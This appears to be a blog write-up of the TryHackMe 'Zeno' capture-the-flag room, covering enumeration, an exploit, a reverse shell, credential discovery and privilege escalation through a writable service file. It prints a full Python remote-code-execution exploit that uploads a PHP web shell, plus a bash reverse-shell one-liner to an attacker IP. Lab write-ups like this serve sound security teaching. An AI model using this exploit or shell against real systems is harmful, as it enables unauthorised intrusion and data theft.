@@ -1,0 +1,174 @@
+---
+title: "Zeno TryHackMe"
+date: "02-26-2022"
+author: "Reda BELHAJ"
+summary: "Do you have the same patience as the great stoic philosopher Zeno? Try it out! Created by  @Biniru!"
+tags: ["TryHackMe", "Ctf", "Writeup"]
+image: "/images/Zeno/bg.png"
+---
+Let’s take a look at the [Zeno CTF](https://tryhackme.com/room/zeno) on TryHackMe Created by **@Biniru**.
+
+## Enumeration
+### Nmap Scan
+The first step of my enumeration was a scan with **nmap**. by the command:
+
+```
+sudo nmap 10.10.85.109 -sS -Pn -A
+```
+The “Nmap Output” displayed `1` service running under port 22.
+![Nmap1](/images/Zeno/nmap1.JPG)
+
+And Also I decided to run another one on all ports:
+
+```
+sudo nmap 10.10.85.109 -sS -Pn -p- -A
+```
+
+And this time “Nmap Output” displayed `2` service running under port 22 and 12340.
+![Nmap2](/images/Zeno/nmap2.JPG)
+
+### Dirsearch Scan
+I next decided to run a Dirsearch scan on the webserver to see if there were any interesting hidden directories, by the command:
+![dirsearch](/images/Zeno/dirsearch.JPG)
+
+After we've completed our scan, and accessing the directory, we find a website with **Restaurant Management System** displayed.
+
+## Exploiting
+Now let’s look for exploits that we can use.
+
+```
+searchsploit Restaurant Management System
+```
+![Searchsploit](/images/Zeno/searchsploit.JPG)
+The Output displayed that there's **RCE**: Remote Code Execution
+
+And I modify the Exploit to:
+
+```Python
+# Exploit Title: Restaurant Management System 1.0  - Remote Code Execution
+# Date: 2019-10-16
+# Exploit Author: Ibad Shah
+# Vendor Homepage: https://www.sourcecodester.com/users/lewa
+# Software Link: https://www.sourcecodester.com/php/11815/restaurant-management-system.html
+# Version: N/A
+# Tested on: Apache 2.4.41
+
+#!/usr/bin/python
+
+import requests
+import sys
+print ("""
+    _  _   _____  __  __  _____   ______            _       _ _
+  _| || |_|  __ \|  \/  |/ ____| |  ____|          | |     (_) |
+ |_  __  _| |__) | \  / | (___   | |__  __  ___ __ | | ___  _| |_
+  _| || |_|  _  /| |\/| |\___ \  |  __| \ \/ / '_ \| |/ _ \| | __|
+ |_  __  _| | \ \| |  | |____) | | |____ >  <| |_) | | (_) | | |_
+   |_||_| |_|  \_\_|  |_|_____/  |______/_/\_\ .__/|_|\___/|_|\__|
+                                             | |
+                                             |_|
+""")
+
+print ("Credits : All InfoSec (Raja Ji's) Group")
+
+url = sys.argv[1]
+
+if len(sys.argv[1]) < 8:
+	print("[+] Usage : python rms-rce.py http://localhost:80/")
+	exit()
+
+print ("[+] Restaurant Management System Exploit, Uploading Shell")
+
+target = url+"admin/foods-exec.php"
+
+headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0)Gecko/20100101 Firefox/69.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate",
+    "Content-Length": "327",
+    "Content-Type": "multipart/form-data;boundary=---------------------------191691572411478",
+    "Connection": "close",
+	"Referer": "http://localhost:8081/rms/admin/foods.php",
+	"Cookie": "PHPSESSID=4dmIn4q1pvs4b79",
+	"Upgrade-Insecure-Requests": "1"
+}
+
+data = """
+-----------------------------191691572411478
+Content-Disposition: form-data; name="photo"; filename="reverse-shell.php"
+Content-Type: text/html
+
+<?php echo shell_exec($_GET["cmd"]); ?>
+-----------------------------191691572411478
+Content-Disposition: form-data; name="Submit"
+
+Add
+-----------------------------191691572411478--
+"""
+
+r = requests.post(target,verify=False, headers=headers,data=data)
+
+print("[+] Shell Uploaded. Please check the URL :"+url+"images/reverse-shell.php")
+```
+
+So it successfully did a RCE and uploaded a shell on the host :
+![done](/images/Zeno/reverseShell.JPG)
+
+And I tried **id** command:
+![testID](/images/Zeno/testID.JPG)
+
+### Reverse Shell
+I set up my netcat listener on port 4444 and I fired up Burp and sent a POST request with the following encoded payload using URL encoding:
+
+```
+sh -i >& /dev/tcp/ 10.8.174.180/4444 0>&1
+```
+![burp](/images/Zeno/burp.JPG)
+
+**Great!** I received a reverse connection on my port 4444.
+
+### Database Discovery
+Now we're in the machine and I decided to take a look at the `config.php` inside `connection` folder. which gave me the username and the password for accessing the database:
+![configPHP](/images/Zeno/configPHP.JPG)
+
+Then I tried to connect to the database using the credentials of last file. And I found some **Password Hashs** inside `members` table:
+![tables](/images/Zeno/tables.JPG)
+![members](/images/Zeno/members.JPG)
+
+And with the help of [CrackStation](https://crackstation.net/). We found 2 out of 3 passwords:
+![crackstation](/images/Zeno/crackstation.JPG)
+
+## User Flag
+Inside the home directory of the `edward` user. I notice a file called `user.txt` but I didn't have the rights to access it:
+![permDENIED](/images/Zeno/permDENIED.JPG)
+
+Then I tried to get `linpeas.sh` with the use of **curl** and **http.server**:
+![serverSTART](/images/Zeno/serverSTART.JPG)
+![getLIN](/images/Zeno/getLIN.JPG)
+
+As I was reading `linpeas.sh` output I found some clear text credentials!
+![linpeasOutput](/images/Zeno/linpeasOutput.JPG)
+![fstab](/images/Zeno/fstab.JPG)
+
+After I've tried to use that password for **edward**:
+![ssh](/images/Zeno/ssh.JPG)
+
+And I got the flag :
+
+```
+THM{******************}
+```
+
+## Root Flag
+Now it’s time to escalate our privileges and get the root flag. The last time when we run `linpeas.sh` we found that we have write permissions on a service file:
+![zenoMonitor](/images/Zeno/zenoMonitor.JPG)
+
+And I modify the command inside the service to:
+![modify](/images/Zeno/modify.JPG)
+
+Then I reboot the system:
+![reboot](/images/Zeno/reboot.JPG)
+
+And after some minutes I entered SSH with edward credentials and I run `/bin/bash -p` and I've become root:
+![root](/images/Zeno/root.JPG)
+
